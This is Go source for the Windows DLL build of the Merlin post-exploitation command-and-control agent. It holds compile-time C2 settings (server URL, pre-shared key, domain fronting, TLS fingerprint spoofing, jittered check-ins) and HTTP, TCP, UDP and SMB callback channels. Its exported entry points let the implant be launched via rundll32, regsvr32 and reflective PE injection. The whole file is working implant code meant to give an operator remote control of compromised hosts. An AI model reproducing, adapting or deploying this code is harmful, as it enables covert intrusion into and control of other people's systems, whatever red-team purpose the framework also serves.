//go:build windows && cgo
// +build windows,cgo

/*
Merlin is a post-exploitation command and control framework.

This file is part of Merlin.
Copyright (C) 2023 Russel Van Tuyl

Merlin is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
any later version.

Merlin is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with Merlin.  If not, see <http://www.gnu.org/licenses/>.
*/

package main

import (
	"C"
	"os"
	"strconv"
	"strings"

	// 3rd Party
	"github.com/google/uuid"

	// Merlin
	"github.com/Ne0nd0g/merlin-agent/v2/agent"
	"github.com/Ne0nd0g/merlin-agent/v2/clients"
	"github.com/Ne0nd0g/merlin-agent/v2/clients/http"
	"github.com/Ne0nd0g/merlin-agent/v2/clients/smb"
	"github.com/Ne0nd0g/merlin-agent/v2/clients/tcp"
	"github.com/Ne0nd0g/merlin-agent/v2/clients/udp"
	mRun "github.com/Ne0nd0g/merlin-agent/v2/run"
)

// GLOBAL VARIABLES
// These are use hard code configurable options during compile time with Go's ldflags -X option

// auth the authentication method the Agent will use to authenticate to the server
var auth = "opaque"

// addr the interface and port the agent will use for network connections
var addr = "127.0.0.1:7777"

// headers a list of HTTP headers the agent will use with the HTTP protocol to communicate with the server
var headers = ""

// host a specific HTTP header used with HTTP communications; notably used for domain fronting
var host = ""

// httpClient is a string that represents what type of HTTP client the Agent should use (e.g., winhttp, go)
var httpClient = "go"

// ja3 a string that represents how the Agent should configure it TLS client
var ja3 = ""

// killdate the date and time, as a unix epoch timestamp, that the agent will quit running
var killdate = "0"

// listener the UUID of the peer-to-peer listener this agent belongs to. Used with delegate messages
var listener = ""

// maxretry the number of failed connections to the server before the agent will quit running
var maxretry = "7"

// opaque the EnvU data from OPAQUE registration so the agent can skip straight to authentication
var opaque []byte

// padding the maximum size for random amounts of data appended to all messages to prevent static message sizes
var padding = "4096"

// parrot a string from the https://github.com/refraction-networking/utls#parroting library to mimic a specific browser
var parrot = ""

// protocol the communication protocol the agent will use to communicate with the server
var protocol = "h2"

// proxy the address of HTTP proxy to send HTTP traffic through
var proxy = ""

// psk is the Pre-Shared Key, the secret used to encrypt messages communications with the server
var psk = "merlin"

// secure a boolean value as a string that determines the value of the TLS InsecureSkipVerify option for HTTP
// communications.
// Must be a string, so it can be set from the Makefile
var secure = "false"

// sleep the amount of time the agent will sleep before it attempts to check in with the server
var sleep = "30s"

// skew the maximum size for random amounts of time to add to the sleep value to vary checkin times
var skew = "3000"

// transforms is an ordered comma seperated list of transforms (encoding/encryption) to apply when constructing a message
// that will be sent to the server
var transforms = "jwe,gob-base"

// url the protocol, address, and port of the Agent's command and control server to communicate with
var url = "https://127.0.0.1:443"

// useragent the HTTP User-Agent header for HTTP communications
var useragent = "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.85 Safari/537.36"

func main() {}

// run is a private function called by exported functions to instantiate/execute the Agent
func run(URL string) {
	// Setup and run agent
	agentConfig := agent.Config{
		Sleep:    sleep,
		Skew:     skew,
		KillDate: killdate,
		MaxRetry: maxretry,
	}
	a, err := agent.New(agentConfig)
	if err != nil {
		os.Exit(1)
	}

	// Parse the secure flag
	var verify bool
	verify, err = strconv.ParseBool(secure)
	if err != nil {
		os.Exit(1)
	}

	// Get the client
	var client clients.Client
	switch protocol {
	case "http", "https", "h2", "h2c", "http3":
		clientConfig := http.Config{
			AgentID:      a.ID(),
			Protocol:     protocol,
			ClientType:   httpClient,
			Host:         host,
			Headers:      headers,
			Proxy:        proxy,
			UserAgent:    useragent,
			PSK:          psk,
			JA3:          ja3,
			Padding:      padding,
			Parrot:       parrot,
			AuthPackage:  auth,
			Opaque:       opaque,
			Transformers: transforms,
			InsecureTLS:  !verify,
		}

		if strings.ToLower(httpClient) == "winhttp" && strings.ToLower(protocol) == "h2" {
			clientConfig.Protocol = "https"
		}

		// URL is the value passed into this function; url is the global variable
		if URL != "" {
			clientConfig.URL = strings.Split(strings.ReplaceAll(url, " ", ""), ",")
		} else if url != "" {
			clientConfig.URL = strings.Split(strings.ReplaceAll(url, " ", ""), ",")
		}

		client, err = http.New(clientConfig)
		if err != nil {
			os.Exit(1)
		}
	case "tcp-bind", "tcp-reverse":
		var listenerID uuid.UUID
		listenerID, err = uuid.Parse(listener)
		if err != nil {
			os.Exit(1)
		}
		config := tcp.Config{
			AgentID:      a.ID(),
			ListenerID:   listenerID,
			PSK:          psk,
			Address:      []string{addr},
			AuthPackage:  auth,
			Transformers: transforms,
			Mode:         protocol,
			Padding:      padding,
		}

		// Get the client
		client, err = tcp.New(config)
		if err != nil {
			os.Exit(1)
		}
	case "udp-bind", "udp-reverse":
		var listenerID uuid.UUID
		listenerID, err = uuid.Parse(listener)
		if err != nil {
			os.Exit(1)
		}
		config := udp.Config{
			AgentID:      a.ID(),
			ListenerID:   listenerID,
			PSK:          psk,
			Address:      []string{addr},
			AuthPackage:  auth,
			Transformers: transforms,
			Mode:         protocol,
			Padding:      padding,
		}

		// Get the client
		client, err = udp.New(config)
		if err != nil {
			os.Exit(1)
		}
	case "smb-bind", "smb-reverse":
		var listenerID uuid.UUID
		listenerID, err = uuid.Parse(listener)
		if err != nil {
			os.Exit(1)
		}
		config := smb.Config{
			Address:      []string{addr},
			AgentID:      a.ID(),
			AuthPackage:  auth,
			ListenerID:   listenerID,
			Padding:      padding,
			PSK:          psk,
			Transformers: transforms,
			Mode:         protocol,
		}
		// Get the client
		client, err = smb.New(config)
		if err != nil {
			os.Exit(1)
		}
	default:
		// Unhandled protocol
		os.Exit(1)
	}

	// Start the agent
	mRun.Run(a, client)
}

// EXPORTED FUNCTIONS

// Run is designed to work with rundll32.exe to execute a Merlin agent.
// The function will process the command line arguments in spot 3 for an optional URL to connect to
//
//export Run
func Run() {
	// If using rundll32 spot 0 is "rundll32", spot 1 is "merlin.dll,Run"
	if len(os.Args) >= 3 {
		if strings.HasPrefix(strings.ToLower(os.Args[0]), "rundll32") {
			url = os.Args[2]
		}
	}
	run(url)
}

// VoidFunc is an exported function used with PowerSploit's Invoke-ReflectivePEInjection.ps1
//
//export VoidFunc
func VoidFunc() { run(url) }

// DllInstall is used when executing the Merlin agent with regsvr32.exe (i.e. regsvr32.exe /s /n /i merlin.dll)
// https://msdn.microsoft.com/en-us/library/windows/desktop/bb759846(v=vs.85).aspx
// TODO add support for passing Merlin server URL with /i:"https://192.168.1.100:443" merlin.dll
//
//export DllInstall
func DllInstall() { run(url) }

// DllRegisterServer is used when executing the Merlin agent with regsvr32.exe (i.e. regsvr32.exe /s merlin.dll)
// https://msdn.microsoft.com/en-us/library/windows/desktop/ms682162(v=vs.85).aspx
//
//export DllRegisterServer
func DllRegisterServer() { run(url) }

// DllUnregisterServer is used when executing the Merlin agent with regsvr32.exe (i.e. regsvr32.exe /s /u merlin.dll)
// https://msdn.microsoft.com/en-us/library/windows/desktop/ms691457(v=vs.85).aspx
//
//export DllUnregisterServer
func DllUnregisterServer() { run(url) }

// Merlin is an exported function that takes in a C *char, converts it to a string, and executes it.
// Intended to be used with DLL loading
//
//export Merlin
func Merlin(u *C.char) {
	if len(C.GoString(u)) > 0 {
		url = C.GoString(u)
	}
	run(url)
}

// TODO add entry point of 0 (yes a zero) for use with Metasploit's windows/smb/smb_delivery
// TODO move exported functions to merlin.c to handle them properly and only export Run()
